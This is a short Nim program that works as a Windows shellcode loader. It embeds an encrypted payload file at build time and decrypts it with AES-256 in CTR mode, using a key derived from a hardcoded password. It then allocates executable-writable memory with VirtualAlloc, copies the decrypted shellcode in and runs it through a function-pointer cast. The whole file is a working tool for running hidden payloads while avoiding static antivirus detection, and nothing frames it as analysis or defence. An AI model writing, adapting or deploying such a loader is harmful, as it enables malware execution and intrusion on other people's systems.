import winim
import nimcrypto

const encshellcode = staticRead"encshellcode64.raw"
const ivfromfile = staticRead"iv.raw"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))


proc main() = 
  let tProcess = GetCurrentProcessId()

  var
    ivseq: seq[byte] = toByteSeq(ivfromfile)
    envkey: string = "1q2w3e4r5t6y"
    dctx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]    
    #enctext = toByteSeq(encshellcode)
    shellcode = newSeq[byte](len(encshellcode))
  
  copyMem(addr iv[0], addr ivseq[0], len(ivfromfile))

  # Expand key to 32 bytes using SHA256 as the KDF
  var expandedkey = sha256.digest(envkey)
  copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

  dctx.init(key, iv)
  #dctx.decrypt(enctext, shellcode)
  dctx.decrypt(toByteSeq(encshellcode), shellcode)  
  dctx.clear()

  #var shellcode = decode(b64)
  
  echo "[*] Target Process: ", tProcess
  # Allocate memory
  let rPtr = VirtualAlloc(
      nil,
      cast[SIZE_T](shellcode.len),
      MEM_COMMIT,
      PAGE_EXECUTE_READ_WRITE
  )

  copyMem(rPtr,unsafeAddr shellcode[0],cast[SIZE_T](shellcode.len))
  let a = cast[proc(){.nimcall.}](rPtr)
  a()

when isMainModule:
  main()
